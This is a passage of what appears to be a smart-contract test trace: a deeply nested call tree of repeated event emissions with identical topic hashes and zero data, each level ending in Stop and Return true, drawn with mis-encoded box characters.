    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА  emit topic 0: 0x3adff1604df08a519c7848023123530b0c9a05bf082395a43c09e02406deea1a
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ        topic 1: 0x4e03657aea45a94fc7d47ba826c8d667c0d1e6e33a64a036ec44f58fa12d6c45
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ           data: 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
